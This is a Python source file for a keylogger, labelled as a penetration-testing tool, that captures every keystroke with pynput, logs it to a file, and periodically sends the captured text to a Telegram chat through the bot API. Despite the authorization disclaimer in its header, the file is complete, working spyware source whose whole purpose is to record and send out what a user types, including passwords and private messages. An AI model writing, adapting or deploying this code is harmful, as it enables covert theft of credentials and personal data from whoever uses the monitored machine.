"""
Keylogger with Telegram Integration
For AUTHORIZED PENETRATION TESTING ONLY

DISCLAIMER: This tool is intended for educational purposes and legitimate 
security assessments where you have explicit permission from the system owner.
Unauthorized use is illegal and unethical.

Author: Ethical Security Research Team
Version: 2.0
"""

import pynput
from pynput.keyboard import Key, Listener
import requests
import time
import threading
import os
import sys
from datetime import datetime
from config import *

# Global variables
keys_buffer = []
is_running = True
keypress_count = 0
last_send_time = time.time()

def show_banner():
    """Display application banner"""
    banner = r"""
  _  __         _     _            ____     _             _             
 | |/ /   ___  | | __| |  _   _   / ___|   | |  ___  ___ | | __  ___    
 | ' /   / _ \ | |/ _` | | | | | | |  _    | |/ _ \/ __|| |/ / / _ \   
 | . \  |  __/ | | (_| | | |_| | | |_| |   | |  __/\__ \|   < |  __/   
 |_|\_\  \___| |_|\__,_|  \__, |  \____|   |_|\___||___/|_|\_\ \___|   
                          |___/                                         
    """
    print(banner)
    print("="*70)
    print("AUTHORIZED PENETRATION TESTING TOOL")
    print("Use only with explicit permission from system owners")
    print("="*70)

def validate_config():
    """Validate configuration settings"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "your_bot_token_here":
        print("❌ ERROR: Please configure your Telegram bot token in config.py")
        return False
    
    if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID == "your_chat_id_here":
        print("❌ ERROR: Please configure your Telegram chat ID in config.py")
        return False
        
    # Validate that tokens look correct
    if len(TELEGRAM_BOT_TOKEN) < 20 or ":" not in TELEGRAM_BOT_TOKEN:
        print("❌ ERROR: Invalid Telegram bot token format")
        return False
        
    if not TELEGRAM_CHAT_ID.lstrip('-').isdigit():
        print("❌ ERROR: Invalid Telegram chat ID format")
        return False
        
    return True

def test_telegram_connection():
    """Test Telegram API connectivity"""
    print("🔍 Testing Telegram connection...")
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            bot_info = response.json()
            print(f"✅ Connected to Telegram bot: @{bot_info['result']['username']}")
            return True
        else:
            print("❌ ERROR: Invalid Telegram bot token or connection issue")
            return False
    except Exception as e:
        print(f"❌ ERROR: Cannot connect to Telegram API: {str(e)}")
        return False

def send_to_telegram(message):
    """Send message to Telegram chat"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️  Telegram configuration missing")
        return False
        
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }
        response = requests.post(url, data=data, timeout=15)
        return response.status_code == 200
    except Exception as e:
        print(f"⚠️  Error sending to Telegram: {str(e)}")
        return False

def format_key(key):
    """Format key for logging"""
    k = str(key).replace("'", "")
    
    # Special character handling
    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n[ENTER]\n",
        "Key.tab": "\t[TAB]\t",
        "Key.backspace": "[BACKSPACE]",
        "Key.shift": "[SHIFT]",
        "Key.ctrl": "[CTRL]",
        "Key.alt": "[ALT]",
        "Key.caps_lock": "[CAPSLOCK]",
        "Key.cmd": "[CMD]",
        "Key.delete": "[DELETE]"
    }
    
    if k in special_keys:
        return special_keys[k]
    
    # Handle other Key.* patterns
    if k.startswith("Key."):
        return f"[{k.upper()[4:]}]"
    
    return k

def write_to_file(keys):
    """Write keys to local file"""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            for key in keys:
                f.write(format_key(key))
    except Exception as e:
        print(f"⚠️  Error writing to local file: {str(e)}")

def process_and_send_logs(force=False):
    """Process accumulated keystrokes and send to Telegram"""
    global keys_buffer, last_send_time
    
    # Determine if we should send logs
    should_send = (
        force or 
        len(keys_buffer) >= BUFFER_FLUSH_THRESHOLD or
        (time.time() - last_send_time) >= SEND_INTERVAL
    )
    
    if keys_buffer and should_send:
        # Write to local file
        write_to_file(keys_buffer)
        
        # Prepare message to send
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    log_content = f.read()
                
                if log_content.strip():
                    # Limit message size for Telegram
                    if len(log_content) > MAX_LOG_SIZE:
                        log_content = log_content[-MAX_LOG_SIZE:]
                    
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    message = f"🤖 Keylogger Report [{timestamp}]\n```\n{log_content}\n```"
                    
                    if send_to_telegram(message):
                        # Clear log file after successful send
                        open(LOG_FILE, "w").close()
                        print(f"✅ Successfully sent log ({len(log_content)} chars)")
                    else:
                        print("⚠️  Failed to send log to Telegram")
                        
        except Exception as e:
            print(f"⚠️  Error processing logs: {str(e)}")
        
        # Clear buffers after processing
        keys_buffer.clear()
        last_send_time = time.time()

def send_logs_periodically():
    """Continuously send logs at configured interval"""
    global is_running
    while is_running:
        time.sleep(5)  # Check every 5 seconds
        if is_running:  # Check again after sleep
            process_and_send_logs()

def on_press(key):
    """Handle key press events"""
    global keys_buffer, keypress_count
    keys_buffer.append(key)
    keypress_count += 1

def on_release(key):
    """Handle key release events"""
    global is_running
    
    # Stop logger when ESC is pressed
    if key == Key.esc:
        print("\n⏹️  ESC key detected. Stopping keylogger...")
        is_running = False
        process_and_send_logs(force=True)  # Send final logs
        return False

def cleanup():
    """Perform cleanup operations"""
    global is_running
    is_running = False
    
    # Final log send
    if keys_buffer:
        process_and_send_logs(force=True)
    
    # Remove temporary file
    try:
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
    except:
        pass
    
    print("\n🧹 Cleanup completed. Goodbye!")

def main():
    """Main entry point"""
    show_banner()
    
    # Validate configuration
    if not validate_config():
        print("\n❗ Please correct configuration errors in config.py")
        sys.exit(1)
    
    # Test connection
    if not test_telegram_connection():
        print("\n❗ Please fix Telegram connection issues")
        sys.exit(1)
    
    print(f"⚙️  Configuration:")
    print(f"   • Log file: {LOG_FILE}")
    print(f"   • Send interval: {SEND_INTERVAL} seconds")
    print(f"   • Buffer threshold: {BUFFER_FLUSH_THRESHOLD} keys")
    print(f"\n🚀 Starting keylogger... Press ESC to stop")
    
    # Register cleanup handler
    import atexit
    atexit.register(cleanup)
    
    # Start the log sending thread
    sender_thread = threading.Thread(target=send_logs_periodically, daemon=True)
    sender_thread.start()
    
    # Start the key listener
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n⏹️  Keyboard interrupt received. Stopping...")
    except Exception as e:
        print(f"❌ Error starting keyboard listener: {str(e)}")
    
    print("\n🛑 Keylogger stopped.")
    process_and_send_logs(force=True)
    print("✅ Final logs sent. Exiting...")

if __name__ == "__main__":
    main()
